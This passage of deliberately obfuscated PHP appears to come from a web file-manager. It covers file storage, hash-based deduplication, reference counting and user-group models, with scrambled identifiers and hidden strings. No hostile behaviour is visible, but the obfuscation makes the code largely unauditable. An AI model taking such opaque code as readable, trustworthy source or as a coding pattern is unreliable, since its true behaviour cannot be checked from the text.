$this->listAll($ÔşÁ‘©§); $œÙêáï = $this->pathParse[$ŒŠëøÀ–[497]]; if (trim($œÙêáï, $ŒŠëøÀ–[8]) == trim(get_path_father($œÙêáï), $ŒŠëøÀ–[8])) { $÷–àÉæ = !0; } return IO::init($ŒŠëøÀ–[12])->listAllSimpleMake($âŠ€”­, $œÙêáï, $÷–àÉæ); } public function getPathOuter($·¿æ–ù®) { $„Æ…ÓÌ =& $_SERVER[°‰†òö¯]; $ïíğü¹¥ = KodIO::parse($·¿æ–ù®); if ($ïíğü¹¥[$„Æ…ÓÌ[33]] == KodIO::KOD_SHARE_ITEM) { return $ïíğü¹¥[$„Æ…ÓÌ[87]]; } $Ñ˜äİ× = KodIO::clear($·¿æ–ù®); $ü©‘ÑÂè = KodIO::clear($this->pathParse[$„Æ…ÓÌ[564]][$„Æ…ÓÌ[1255]]); $ôšÔ”ëò = substr($Ñ˜äİ×, strlen($ü©‘ÑÂè)); if (substr($Ñ˜äİ×, 0, strlen($ü©‘ÑÂè)) != $ü©‘ÑÂè) { return !1; } return $this->pathParse[$„Æ…ÓÌ[1249]] . $„Æ…ÓÌ[8] . ltrim($ôšÔ”ëò, $„Æ…ÓÌ[8]); } public function getType() { $Ü‘ª®¹¯ =& $_SERVER[°‰†òö¯]; $Çù¯À« = str_replace($Ü‘ª®¹¯[77], $Ü‘ª®¹¯[12], get_class($this)); return strtolower($Çù¯À«); } public function isOsDriver($¶¥¶›ˆ) { return IO::isOsDriver($¶¥¶›ˆ); } public function info($›’¸ò½ì) { return $this->infoParse($›’¸ò½ì); } public function infoAuth($…ƒ–ØÎŞ) { return $this->infoParse($…ƒ–ØÎŞ); } public function infoWithChildren($¡İç¦‡æ) { return $this->infoParse($¡İç¦‡æ, !0); } public function infoFull($Æ¶®şäŠ) { return $this->infoParse($Æ¶®şäŠ); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($Ñ»ÍŞÇ) { $this->pathParse = $Ñ»ÍŞÇ; } protected function infoParse($‡ïû¶—, $Îàô°ƒÂ = false) { $§æäÃ’¥ =& $_SERVER[°‰†òö¯]; return Action($§æäÃ’¥[1254])->sharePathInfo($this->pathParse[$§æäÃ’¥[87]], !0, $Îàô°ƒÂ); } public function listPath($§€™¼öò, $Ù¸ÏâÅ² = false) { $ğŒ¹µçÜ =& $_SERVER[°‰†òö¯]; $‰­¥û¬µ = IO::listPath($§€™¼öò, $Ù¸ÏâÅ²); if (!$‰­¥û¬µ) { return $‰­¥û¬µ; } if (is_array($‰­¥û¬µ[$ğŒ¹µçÜ[1427]])) { $¢¹çù´› = Action($ğŒ¹µçÜ[1436])->parsePathChildren($‰­¥û¬µ[$ğŒ¹µçÜ[1427]], array($ğŒ¹µçÜ[497] => $§€™¼öò)); $‰­¥û¬µ[$ğŒ¹µçÜ[1427]] = Action($ğŒ¹µçÜ[1254])->shareItemInfo($¢¹çù´›); } foreach ($‰­¥û¬µ as $¯£›ø®ü => $¤‚ÙİáÍ) { if (!in_array($¯£›ø®ü, array($ğŒ¹µçÜ[86], $ğŒ¹µçÜ[85]))) { continue; } foreach ($¤‚ÙİáÍ as $øõÅ· => $¢¹çù´›) { $¢¹çù´› = Action($ğŒ¹µçÜ[1436])->parsePathChildren($¢¹çù´›, array($ğŒ¹µçÜ[497] => $§€™¼öò)); $‰­¥û¬µ[$¯£›ø®ü][$øõÅ·] = Action($ğŒ¹µçÜ[1254])->shareItemInfo($¢¹çù´›); } } return $‰­¥û¬µ; } } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($ŠÄËÍÃ¸) { parent::__construct($ŠÄËÍÃ¸); $this->setSignVersion($_SERVER[°‰†òö¯][249]); } } goto fí´ˆé†¸; C•Ê´Ôˆæ‰: class FileModel extends ModelBase { protected $tableName = "\x69\157\x5f\146\x69\154\x65"; protected $tableMeta = array("\x74\x61\142\154\x65\x4e\141\155\145" => "\151\157\x5f\146\x69\x6c\x65\137\155\145\x74\141", "\x6d\145\164\x61\x46\x69\x65\154\144" => "\146\151\x6c\145\x49\104"); public function fileInfo($ÇûğØµ) { $É§âù€ =& $_SERVER[°‰†òö¯]; static $­¬ØÎÂ™ = array(); if (!isset($­¬ØÎÂ™[$ÇûğØµ])) { $ÜÄ¸­ı¢ = $É§âù€[2022]; $Ô­¿ñùÒ = Model($É§âù€[548])->field($ÜÄ¸­ı¢)->where(array($É§âù€[546] => $ÇûğØµ))->find(); $­¬ØÎÂ™[$ÇûğØµ] = $Ô­¿ñùÒ; } return $­¬ØÎÂ™[$ÇûğØµ]; } public function addFileByContent($Ï‚ñ…úƒ = '', $ò¢ô±ïô = '') { $ï“É¢êà =& $_SERVER[°‰†òö¯]; $ã ÈÌ•ç = TEMP_PATH . $ï“É¢êà[2023]; if (!is_dir($ã ÈÌ•ç)) { mk_dir($ã ÈÌ•ç); } $ÃïÖêÉ‘ = $ã ÈÌ•ç . $ï“É¢êà[2024] . rand_string(16); $İÙ©ø· = file_put_contents($ÃïÖêÉ‘, $Ï‚ñ…úƒ); if ($İÙ©ø· === !1 || strlen($Ï‚ñ…úƒ) != $İÙ©ø·) { return !1; } $òĞİÉºÈ = $this->addFile($ÃïÖêÉ‘, $ò¢ô±ïô, !0); if (file_exists($ÃïÖêÉ‘)) { @unlink($ÃïÖêÉ‘); } return $òĞİÉºÈ; } public function createFileName($…úÍú’Ù, $ÎÏ…ëˆ = false, $¢¼î¸Ñ = false) { $ğ‰¯½µ© =& $_SERVER[°‰†òö¯]; $“‘¼Êá = IO::init($ğ‰¯½µ©[8]); $”î˜¯šœ = $this->makeFilePath($…úÍú’Ù, $“‘¼Êá, $ÎÏ…ëˆ, $¢¼î¸Ñ); $É²ôğĞâ = $“‘¼Êá->pathFather($”î˜¯šœ); static $š±Ä˜Ç = false; $üÇÀÑ˜Ï = $ğ‰¯½µ©[2025] . md5($É²ôğĞâ); if (!$š±Ä˜Ç && !Cache::get($üÇÀÑ˜Ï)) { $š±Ä˜Ç = !0; $©¾«šíš = IO::mkdir($É²ôğĞâ); if (!IO::exist($©¾«šíš . $ğ‰¯½µ©[860])) { IO::mkfile($©¾«šíš . $ğ‰¯½µ©[860]); } Cache::set($üÇÀÑ˜Ï, 1, 3600 * 2); } return $”î˜¯šœ; } public function makeFilePath($Ç¡ä¯«Á, $Ş³©Ô±ù, $Š„÷®“€ = false, $ø°ğ•×ç = false) { $‡Ÿ‘ôâ =& $_SERVER[°‰†òö¯]; $öäëæ®ƒ = Model($‡Ÿ‘ôâ[831])->get($‡Ÿ‘ôâ[2026]); $¤‘„ü = KodIO::defaultIO() . date($‡Ÿ‘ôâ[2027]); $ıê¦ŠÀë = $¤‘„ü . rand_string(5) . short_id(100); $Ç¡ä¯«Á = str_replace($‡Ÿ‘ôâ[8], $‡Ÿ‘ôâ[11], KodIO::clear($Ç¡ä¯«Á)); $…¯¯ä¤ = $Ş³©Ô±ù->ext($Ç¡ä¯«Á); if (!$Ç¡ä¯«Á) { $öäëæ®ƒ = $‡Ÿ‘ôâ[837]; } switch ($öäëæ®ƒ) { case $‡Ÿ‘ôâ[2028]: if ($…¯¯ä¤) { $ıê¦ŠÀë = $ıê¦ŠÀë . $‡Ÿ‘ôâ[10] . $…¯¯ä¤; } if ($…¯¯ä¤ == $‡Ÿ‘ôâ[1964]) { $ıê¦ŠÀë .= $‡Ÿ‘ôâ[1289]; } break; case $‡Ÿ‘ôâ[2029]: $›ÂŸŞŸì = Model($‡Ÿ‘ôâ[831])->get($‡Ÿ‘ôâ[832]); $öÓıùÛé = substr(md5($‡Ÿ‘ôâ[833] . $›ÂŸŞŸì . date($‡Ÿ‘ôâ[810])), 0, 8); $èƒ±Óı‰ = KodIO::defaultDriver(); $¤‘„ü = $‡Ÿ‘ôâ[1320] . $èƒ±Óı‰[$‡Ÿ‘ôâ[477]] . $‡Ÿ‘ôâ[486] . date($‡Ÿ‘ôâ[2030]) . $öÓıùÛé . $‡Ÿ‘ôâ[8]; if ($…¯¯ä¤ == $‡Ÿ‘ôâ[1964]) { $Ç¡ä¯«Á .= $‡Ÿ‘ôâ[1289]; } $³ÆâÀ¦î = $‡Ÿ‘ôâ[2031] . $¤‘„ü . $Ç¡ä¯«Á; CacheLock::lock($³ÆâÀ¦î); $ıê¦ŠÀë = $¤‘„ü . $Ç¡ä¯«Á; if (IO::exist($¤‘„ü . $Ç¡ä¯«Á)) { $…ªÈ‚İ³ = substr($Ç¡ä¯«Á, 0, strlen($Ç¡ä¯«Á) - strlen($…¯¯ä¤)); $Ş¼ç…¹‘ = $ø°ğ•×ç ? substr($ø°ğ•×ç, 0, 5) : ($Š„÷®“€ ? substr($Š„÷®“€, 0, 5) : rand_string(5)); $ıê¦ŠÀë = $¤‘„ü . $…ªÈ‚İ³ . $Ş¼ç…¹‘; if ($…¯¯ä¤) { $ıê¦ŠÀë = $ıê¦ŠÀë . $‡Ÿ‘ôâ[10] . $…¯¯ä¤; } } if (IO::isOsDriver($ıê¦ŠÀë) && !IO::isUploadServer($ıê¦ŠÀë)) { if (IO::exist($ıê¦ŠÀë)) { CacheLock::unlock($³ÆâÀ¦î); return $ıê¦ŠÀë; } $ù£éúƒÁ = IO::setContent($ıê¦ŠÀë, $‡Ÿ‘ôâ[12]); if (!$ù£éúƒÁ) { show_json($‡Ÿ‘ôâ[2032], !1); } } CacheLock::unlock($³ÆâÀ¦î); break; case $‡Ÿ‘ôâ[837]: break; default: break; } return $ıê¦ŠÀë; } public function addFileByRemote($‘º¶ÈÕĞ, $Ùˆ›®»ó, $á†úÉš“ = array()) { $¥‹“‡¨ı =& $_SERVER[°‰†òö¯]; if (!IO::exist($‘º¶ÈÕĞ)) { return !1; } $²›âÙ = $á†úÉš“[$¥‹“‡¨ı[551]] ? $á†úÉš“[$¥‹“‡¨ı[551]] : $¥‹“‡¨ı[12]; $ì«ªŞöŒ = IO::hashMd5($‘º¶ÈÕĞ, $²›âÙ); $ìåöĞòÜ = KodIO::defaultDriver(); $à®ÁË§» = array($¥‹“‡¨ı[624] => IO::size($‘º¶ÈÕĞ), $¥‹“‡¨ı[2033] => 1, $¥‹“‡¨ı[496] => $Ùˆ›®»ó, $¥‹“‡¨ı[874] => $ìåöĞòÜ[$¥‹“‡¨ı[477]], $¥‹“‡¨ı[497] => $‘º¶ÈÕĞ, $¥‹“‡¨ı[2034] => $á†úÉš“[$¥‹“‡¨ı[679]] ? $á†úÉš“[$¥‹“‡¨ı[679]] : IO::hashSimple($‘º¶ÈÕĞ), $¥‹“‡¨ı[2035] => $ì«ªŞöŒ ? $ì«ªŞöŒ : $²›âÙ); if ($Îè¦š¹è = $this->addFileCheckExist($à®ÁË§»[$¥‹“‡¨ı[679]], $à®ÁË§»[$¥‹“‡¨ı[551]], $à®ÁË§»[$¥‹“‡¨ı[79]])) { return $Îè¦š¹è; } return $this->addFileData($à®ÁË§»); } private function addFileData($Ä–Õ¹±Â) { $õ›ã§Ÿ‹ =& $_SERVER[°‰†òö¯]; if (!$Ä–Õ¹±Â) { return !1; } $Ä–Õ¹±Â[$õ›ã§Ÿ‹[79]] = intval($Ä–Õ¹±Â[$õ›ã§Ÿ‹[79]]); if (!$Ä–Õ¹±Â[$õ›ã§Ÿ‹[79]] && strlen($Ä–Õ¹±Â[$õ›ã§Ÿ‹[679]]) > 32) { $Ä–Õ¹±Â[$õ›ã§Ÿ‹[79]] = intval(substr($Ä–Õ¹±Â[$õ›ã§Ÿ‹[679]], 32)); } $’ïœö­“ = $this->add($Ä–Õ¹±Â); return $this->find($’ïœö­“); } public function addFile($ÔşÓ›Ê, $òó•óÆœ, $İŸÚÊ®Š = false) { $ÏÑ´ï‘ =& $_SERVER[°‰†òö¯]; $äàşë”Ï = IO::hashSimple($ÔşÓ›Ê); $‹ÎÇñşø = IO::size($ÔşÓ›Ê); $Íó¡¦Ëú = $‹ÎÇñşø <= 1024 * 1024 * 10 ? IO::hashMd5($ÔşÓ›Ê) : $ÏÑ´ï‘[12]; $«ÉÑ«èµ = $ÏÑ´ï‘[2036] . $äàşë”Ï; CacheLock::lock($«ÉÑ«èµ); if ($Íó¡¦Ëú && $äàşë”Ï) { $´­Ï—éÇ = $this->addFileCheckExist($äàşë”Ï, $Íó¡¦Ëú, $‹ÎÇñşø); if ($´­Ï—éÇ) { CacheLock::unlock($«ÉÑ«èµ); return $´­Ï—éÇ; } } $ÎÎáŒ÷¼ = $this->addFileMake($ÔşÓ›Ê, $‹ÎÇñşø, $äàşë”Ï, $Íó¡¦Ëú, $òó•óÆœ, $İŸÚÊ®Š); $±…ÔĞ…Ò = $this->addFileData($ÎÎáŒ÷¼); if (!$±…ÔĞ…Ò) { return !1; } CacheLock::unlock($«ÉÑ«èµ); if (!$Íó¡¦Ëú && $±…ÔĞ…Ò) { $this->fileMd5Check($±…ÔĞ…Ò); } return $±…ÔĞ…Ò; } public function fileMd5Check($ë¢áİò) { $¡Ğö÷Êñ =& $_SERVER[°‰†òö¯]; $¤ûüáÛ… = array($ë¢áİò[$¡Ğö÷Êñ[545]], $ë¢áİò[$¡Ğö÷Êñ[87]]); $‡ıù‰ë = $¡Ğö÷Êñ[2037] . $ë¢áİò[$¡Ğö÷Êñ[87]]; $šûÌşÁÏ = $¡Ğö÷Êñ[2038] . $ë¢áİò[$¡Ğö÷Êñ[545]]; TaskQueue::add($¡Ğö÷Êñ[2039], $¤ûüáÛ…, $‡ıù‰ë, $šûÌşÁÏ); } public function fileMd5Set($ÒÆ÷’†á, $¯Ú˜®âì) { $ÎÜ²ÉŒ =& $_SERVER[°‰†òö¯]; $ ÓÒı¶÷ = $this->find($ÒÆ÷’†á); if (!$ ÓÒı¶÷ || $ ÓÒı¶÷[$ÎÜ²ÉŒ[551]]) { return; } $œ³™– = IO::hashMd5($¯Ú˜®âì); if (!$œ³™–) { return $ÎÜ²ÉŒ[12]; } $this->where(array($ÎÜ²ÉŒ[545] => $ÒÆ÷’†á))->save(array($ÎÜ²ÉŒ[551] => $œ³™–)); } public function addFileMake($ò’Â ú•, $¦æøî®, $•™ØÍˆ, $õ±¾Æ¦·, $™ÑËèğ, $³…×•‚) { $Á˜¯Ê¦ =& $_SERVER[°‰†òö¯]; $œÄı¬‹ = $this->createFileName($™ÑËèğ, $•™ØÍˆ, $õ±¾Æ¦·); $ÍÉÆ…’ = get_path_father($œÄı¬‹); $¤½¬ë‹ = get_path_this($œÄı¬‹); if ($³…×•‚) { $èÏš¼¹¨ = IO::move($ò’Â ú•, $ÍÉÆ…’, !1, $¤½¬ë‹); } else { $èÏš¼¹¨ = IO::copy($ò’Â ú•, $ÍÉÆ…’, !1, $¤½¬ë‹); } if (!$èÏš¼¹¨ || IO::size($œÄı¬‹) != $¦æøî®) { return !1; } $¨­û×’¿ = KodIO::defaultDriver(); $ÏË‡Ÿ = array($Á˜¯Ê¦[624] => $¦æøî®, $Á˜¯Ê¦[2033] => 1, $Á˜¯Ê¦[496] => $™ÑËèğ, $Á˜¯Ê¦[874] => $¨­û×’¿[$Á˜¯Ê¦[477]], $Á˜¯Ê¦[497] => $œÄı¬‹, $Á˜¯Ê¦[2034] => $•™ØÍˆ, $Á˜¯Ê¦[2035] => $õ±¾Æ¦·); return $ÏË‡Ÿ; } public function addFileCheckExist($ÙâÖò™ç, $Ê»çÊâ¾, $·˜¦¬·) { $äáëãÚ« =& $_SERVER[°‰†òö¯]; $ŒÚõîçã = $this->findByHash($ÙâÖò™ç, $Ê»çÊâ¾); if (!$ŒÚõîçã) { return !1; } $ÆÊõÚ˜ì = array($äáëãÚ«[2033] => intval($ŒÚõîçã[$äáëãÚ«[2040]]) + 1, $äáëãÚ«[624] => $·˜¦¬·); $this->where(array($äáëãÚ«[546] => $ŒÚõîçã[$äáëãÚ«[545]]))->save($ÆÊõÚ˜ì); return $ŒÚõîçã; } public function remove($Û²Ì³¬¦) { $this->linkCountChange($Û²Ì³¬¦, !1); $this->clearEmpty(); return !0; } public function linkAdd($ğâı‡ó€) { $this->linkCountChange($ğâı‡ó€, !0); } public function linkCountChange($‡©ş¾çİ, $ÕÌù÷¾) { $Ã¼—Ù¿ =& $_SERVER[°‰†òö¯]; if (!$‡©ş¾çİ) { return; } if (!is_array($‡©ş¾çİ)) { $‡©ş¾çİ = array($‡©ş¾çİ); } $†œÜº¨Ç = array(); foreach ($‡©ş¾çİ as $Ûº¸Ë³“) { $›µ¥‚¹ = $Ûº¸Ë³“ . $Ã¼—Ù¿[12]; if (!$†œÜº¨Ç[$›µ¥‚¹]) { $†œÜº¨Ç[$›µ¥‚¹] = 0; } $†œÜº¨Ç[$›µ¥‚¹]++; } $Åğ›ğ”À = array(); foreach ($†œÜº¨Ç as $Ûº¸Ë³“ => $şŒÛô‰) { $›µ¥‚¹ = $şŒÛô‰ . $Ã¼—Ù¿[12]; if (!$Åğ›ğ”À[$›µ¥‚¹]) { $Åğ›ğ”À[$›µ¥‚¹] = array(); } $Åğ›ğ”À[$›µ¥‚¹][] = $Ûº¸Ë³“; } foreach ($Åğ›ğ”À as $şŒÛô‰ => $ÆÓšœÕ²) { if (!$ÆÓšœÕ²) { continue; } $şŒÛô‰ = $ÕÌù÷¾ ? $şŒÛô‰ : -intval($şŒÛô‰); $­¹¶‚» = array($Ã¼—Ù¿[545] => array($Ã¼—Ù¿[7], $ÆÓšœÕ²)); if ($şŒÛô‰ < 0) { $­¹¶‚»[$Ã¼—Ù¿[2040]] = array($Ã¼—Ù¿[1090], abs($şŒÛô‰)); } $this->where($­¹¶‚»)->setAdd($Ã¼—Ù¿[2040], $şŒÛô‰); } } public function findByHash($·´°™•°, $›İ¾ÆÙÛ = false) { $áõ¼àßÔ =& $_SERVER[°‰†òö¯]; if (!$·´°™•° && !$›İ¾ÆÙÛ) { return !1; } $¨¤ÂŞÌ = array($áõ¼àßÔ[2034] => $·´°™•°); if ($›İ¾ÆÙÛ) { $¨¤ÂŞÌ = array($áõ¼àßÔ[2035] => $›İ¾ÆÙÛ); } return $this->order($áõ¼àßÔ[2041])->where($¨¤ÂŞÌ)->find(); } public function clearEmpty($Êœİ¤è = 1) { $ş¿‚Û–ß =& $_SERVER[°‰†òö¯]; $âãÃ¸øç = time() - 3600 * 24 * $Êœİ¤è; $çõÖ´ë¼ = $ş¿‚Û–ß[2042] . $âãÃ¸øç; $Ÿâò¼ûÒ = $this->where($çõÖ´ë¼)->select(); if (!$Ÿâò¼ûÒ) { return; } $©¼Í—’Ç = new Task($ş¿‚Û–ß[2043], $ş¿‚Û–ß[12], count($Ÿâò¼ûÒ)); foreach ($Ÿâò¼ûÒ as $Åæ­ı™) { $©¼Í—’Ç->update(1); $this->resetFile($Åæ­ı™); } $©¼Í—’Ç->end(); } public function resetFile($ ØÈ˜®¿) { $Å³ª´»ˆ =& $_SERVER[°‰†òö¯]; $šÆ±Ğ = array($Å³ª´»ˆ[546] => $ ØÈ˜®¿[$Å³ª´»ˆ[545]]); $úø”½ÛÑ = Model($Å³ª´»ˆ[1419])->where($šÆ±Ğ)->count(); $Š†“İ = Model($Å³ª´»ˆ[2044])->where($šÆ±Ğ)->count(); $¢àš–¨§ = intval($úø”½ÛÑ) + intval($Š†“İ); if ($¢àš–¨§ == 0) { IO::remove($ ØÈ˜®¿[$Å³ª´»ˆ[87]]); Model($Å³ª´»ˆ[2045])->delete($ ØÈ˜®¿[$Å³ª´»ˆ[545]]); $this->where($šÆ±Ğ)->delete(); $this->metaSet($ ØÈ˜®¿[$Å³ª´»ˆ[545]], null, null); write_log(ACTION . $Å³ª´»ˆ[2046] . KodUser::id() . $Å³ª´»ˆ[2047] . $ ØÈ˜®¿[$Å³ª´»ˆ[545]] . $Å³ª´»ˆ[2048] . $ ØÈ˜®¿[$Å³ª´»ˆ[79]] . $Å³ª´»ˆ[201] . $ ØÈ˜®¿[$Å³ª´»ˆ[87]], $Å³ª´»ˆ[2049]); return; } if ($ ØÈ˜®¿[$Å³ª´»ˆ[2040]] != $¢àš–¨§) { $this->where($šÆ±Ğ)->save(array($Å³ª´»ˆ[2033] => $¢àš–¨§)); } } public function storageInfo($é¢ûœ£ = false) { $¼‚å­Áé =& $_SERVER[°‰†òö¯]; $©Ìî­˜¼ = $this->count() + 0.0; $ªªËÑçä = 0; $‰è«àÃÊ = 1; $ ÑˆëŠ¿ = 0; $ƒÛÛÊİ = 5000; for ($µêø™Ç­ = 0; $µêø™Ç­ < $©Ìî­˜¼; $µêø™Ç­ = $µêø™Ç­ + $ƒÛÛÊİ) { $šÎ•—›ã = $this->limit($µêø™Ç­, $µêø™Ç­ + $ƒÛÛÊİ)->select(); foreach ($šÎ•—›ã as $Ñºúá¶) { $‰è«àÃÊ += $Ñºúá¶[$¼‚å­Áé[79]] * $Ñºúá¶[$¼‚å­Áé[2040]]; $ªªËÑçä += $Ñºúá¶[$¼‚å­Áé[79]] * ($Ñºúá¶[$¼‚å­Áé[2040]] - 1); $ ÑˆëŠ¿ += $Ñºúá¶[$¼‚å­Áé[2040]]; } } $òùê®÷ = array($¼‚å­Áé[2050] => $‰è«àÃÊ, $¼‚å­Áé[2051] => $ªªËÑçä, $¼‚å­Áé[2052] => $ªªËÑçä / $‰è«àÃÊ, $¼‚å­Áé[83] => $©Ìî­˜¼, $¼‚å­Áé[2053] => $ ÑˆëŠ¿); return $òùê®÷; } } class GroupModel extends ModelBase { protected $tableName = "\x67\162\157\165\160"; protected $tableMeta = array("\164\141\x62\154\145\116\141\155\x65" => "\147\x72\x6f\165\x70\137\155\145\x74\x61", "\155\x65\164\141\x46\151\x65\154\144" => "\x67\x72\x6f\165\x70\x49\104"); protected function cacheFunctionAlias($ßØ·Îóñ) { $¤Á­ä¥§ =& $_SERVER[°‰†òö¯]; return array($¤Á­ä¥§[2054] => array($ßØ·Îóñ[0], $¤Á­ä¥§[2055]), $¤Á­ä¥§[2056] => array($ßØ·Îóñ[0], $¤Á­ä¥§[2057])); } protected function getInfo($°÷Â«úä, $ìãÍØ¥° = false) { $”«  = $this->getInfoSimple($°÷Â«úä); if (!$”« ) { return !1; } if ($ìãÍØ¥°) { return $this->_listDataApplyItem($”« ); } return $this->cacheFunctionGet($_SERVER[°‰†òö¯][2058], $°÷Â«úä); } protected function getInfoSimple($‚–ú»×Ÿ, $Şœ©¬Ğé = false) { $Şï¥Ê« =& $_SERVER[°‰†òö¯]; if ($Şœ©¬Ğé) { $çôíÅÈ’ = array($Şï¥Ê«[1972] => intval($‚–ú»×Ÿ)); $Œ€Ş´ºÎ = $this->where($çôíÅÈ’)->find(); return is_array($Œ€Ş´ºÎ) ? $Œ€Ş´ºÎ : array(); } return $this->cacheFunctionGet($Şï¥Ê«[2059], $‚–ú»×Ÿ); } protected function groupAdd($øİ› °ç) { $àşÛ§Ä =& $_SERVER[°‰†òö¯]; if (!$øİ› °ç[$àşÛ§Ä[192]] && isset($øİ› °ç[$àşÛ§Ä[1972]]) && $øİ› °ç[$àşÛ§Ä[1972]] == 1) { if ($Á¨üıË“ = $this->getInfoSimple($øİ› °ç[$àşÛ§Ä[1972]], !0)) { return $øİ› °ç[$àşÛ§Ä[1972]]; } } else { $Á¨üıË“ = $this->getInfoSimple($øİ› °ç[$àşÛ§Ä[192]]); if (!$Á¨üıË“) { return !1; } } $î£Õ·“† = $àşÛ§Ä[597]; if ($Á¨üıË“[$àşÛ§Ä[588]]) { $î£Õ·“† = $Á¨üıË“[$àşÛ§Ä[588]] . $Á¨üıË“[$àşÛ§Ä[1972]] . $àşÛ§Ä[50]; } $šêÊÆûƒ = array($àşÛ§Ä[496] => $this->groupNameAuto($øİ› °ç[$àşÛ§Ä[192]], $øİ› °ç[$àşÛ§Ä[32]]), $àşÛ§Ä[479] => $øİ› °ç[$àşÛ§Ä[192]], $àşÛ§Ä[659] => $î£Õ·“†, $àşÛ§Ä[2060] => $øİ› °ç[$àşÛ§Ä[1958]], $àşÛ§Ä[2061] => 0, $àşÛ§Ä[1976] => 0); if (isset($øİ› °ç[$àşÛ§Ä[1996]])) { $šêÊÆûƒ[$àşÛ§Ä[1996]] = $øİ› °ç[$àşÛ§Ä[1996]]; } else { $­úùâ¼Ş = $this->max($àşÛ§Ä[1996]); if (!$­úùâ¼Ş) { $­úùâ¼Ş = 0; } $šêÊÆûƒ[$àşÛ§Ä[1996]] = $­úùâ¼Ş + 1; } if (!empty($øİ› °ç[$àşÛ§Ä[1972]])) { $šêÊÆûƒ[$àşÛ§Ä[1972]] = $øİ› °ç[$àşÛ§Ä[1972]]; } $Îİ‹ª¥ğ = $this->add($šêÊÆûƒ); $this->setNamePinyin($Îİ‹ª¥ğ, $šêÊÆûƒ[$àşÛ§Ä[32]]); if (isset($øİ› °ç[$àşÛ§Ä[2062]])) { $this->metaSet($Îİ‹ª¥ğ, array($àşÛ§Ä[2062] => $øİ› °ç[$àşÛ§Ä[2062]], $àşÛ§Ä[2063] => $øİ› °ç[$àşÛ§Ä[2063]])); unset($øİ› °ç[$àşÛ§Ä[2062]]); unset($øİ› °ç[$àşÛ§Ä[2063]]); } Model($àşÛ§Ä[1419])->groupRootAdd($Îİ‹ª¥ğ); $this->_clearCache($øİ› °ç[$àşÛ§Ä[192]]); return $Îİ‹ª¥ğ; } protected function groupEdit($¡à€ÑÜà, $Ã“Ğ›ƒğ) { $­ƒü³Ä =& $_SERVER[°‰†òö¯]; $¾çïæ‹Í = $this->getInfoSimple($¡à€ÑÜà); if (!$¾çïæ‹Í) { return !1; } if (!empty($Ã“Ğ›ƒğ[$­ƒü³Ä[192]])) { $ÀÅûÊ†Å = $this->getInfoSimple($Ã“Ğ›ƒğ[$­ƒü³Ä[192]]); if (!$ÀÅûÊ†Å) { return !1; } if ($¾çïæ‹Í[$­ƒü³Ä[1972]] == $ÀÅûÊ†Å[$­ƒü³Ä[1972]]) { return !1; } if ($Ã“Ğ›ƒğ[$­ƒü³Ä[192]] != $¾çïæ‹Í[$­ƒü³Ä[192]]) { if ($ÀÅûÊ†Å[$­ƒü³Ä[588]] !== $¾çïæ‹Í[$­ƒü³Ä[588]] && strpos($ÀÅûÊ†Å[$­ƒü³Ä[588]], $¾çïæ‹Í[$­ƒü³Ä[588]] . $¾çïæ‹Í[$­ƒü³Ä[1972]] . $­ƒü³Ä[50]) === 0) { return !1; } $Ã“Ğ›ƒğ[$­ƒü³Ä[659]] = $ÀÅûÊ†Å[$­ƒü³Ä[588]] . $Ã“Ğ›ƒğ[$­ƒü³Ä[192]] . $­ƒü³Ä[50]; $this->_changeChildLevel($¾çïæ‹Í, $ÀÅûÊ†Å); $this->_clearCache($ÀÅûÊ†Å[$­ƒü³Ä[1972]]); $this->_clearCache($¾çïæ‹Í[$­ƒü³Ä[192]]); } } if (isset($Ã“Ğ›ƒğ[$­ƒü³Ä[32]])) { $this->setNamePinyin($¡à€ÑÜà, $Ã“Ğ›ƒğ[$­ƒü³Ä[32]]); } if (isset($Ã“Ğ›ƒğ[$­ƒü³Ä[2062]])) { $this->metaSet($¡à€ÑÜà, array($­ƒü³Ä[2062] => $Ã“Ğ›ƒğ[$­ƒü³Ä[2062]], $­ƒü³Ä[2063] => $Ã“Ğ›ƒğ[$­ƒü³Ä[2063]])); unset($Ã“Ğ›ƒğ[$­ƒü³Ä[2062]]); unset($Ã“Ğ›ƒğ[$­ƒü³Ä[2063]]); } $this->_clearChildrenCache($¾çïæ‹Í); return $this->where(array($­ƒü³Ä[2064] => $¡à€ÑÜà))->save($Ã“Ğ›ƒğ); } private function _clearChildrenCache($Ø¹½é›İ) { $µ•ƒäª =& $_SERVER[°‰†òö¯]; $ı–ßªæ§ = array($µ•ƒäª[659] => array($µ•ƒäª[619], $Ø¹½é›İ[$µ•ƒäª[588]] . $Ø¹½é›İ[$µ•ƒäª[1972]] . $µ•ƒäª[620])); $ ³ÙĞ×¶ = $this->field($µ•ƒäª[1972])->where($ı–ßªæ§)->select(); foreach ($ ³ÙĞ×¶ as $ĞØ”óçÌ) { $this->_clearCache($ĞØ”óçÌ[$µ•ƒäª[1972]]); } } private function _clearCache($çÑ·×ì) { $Ìˆâ¶õ =& $_SERVER[°‰†òö¯]; $this->cacheFunctionClear($Ìˆâ¶õ[2058], $çÑ·×ì); $this->cacheFunctionClear($Ìˆâ¶õ[2059], $çÑ·×ì); } private function _changeChildLevel($Õ¼óÄ¬”, $’Û™§›Ş, $ãìÁŒé = false) { $˜ÔÃàƒ“ =& $_SERVER[°‰†òö¯]; $÷£¼ ›œ = $Õ¼óÄ¬”[$˜ÔÃàƒ“[588]] . $Õ¼óÄ¬”[$˜ÔÃàƒ“[1972]] . $˜ÔÃàƒ“[50]; $ÙÅèÊø = $’Û™§›Ş[$˜ÔÃàƒ“[588]] . $’Û™§›Ş[$˜ÔÃàƒ“[1972]] . $˜ÔÃàƒ“[50] . $Õ¼óÄ¬”[$˜ÔÃàƒ“[1972]] . $˜ÔÃàƒ“[50]; if ($ãìÁŒé) { $ÙÅèÊø = $’Û™§›Ş[$˜ÔÃàƒ“[588]] . $’Û™§›Ş[$˜ÔÃàƒ“[1972]] . $˜ÔÃàƒ“[50]; } $†»Ÿ ¿ = array($˜ÔÃàƒ“[659] => array($˜ÔÃàƒ“[619], $Õ¼óÄ¬”[$˜ÔÃàƒ“[588]] . $Õ¼óÄ¬”[$˜ÔÃàƒ“[1972]] . $˜ÔÃàƒ“[620])); $ËşÃğã¶ = array($˜ÔÃàƒ“[659] => array($˜ÔÃàƒ“[668], "\162\x65\160\x6c\141\x63\x65\50\160\x61\x72\x65\x6e\x74\x4c\x65\166\x65\x6c\54\x27{$÷£¼ ›œ}\x27\x2c\x27{$ÙÅèÊø}\47\51")); $this->_clearChildrenCache($Õ¼óÄ¬”); $this->where($†»Ÿ ¿)->data($ËşÃğã¶)->save(); } public function setNamePinyin($øìË²œ‘, 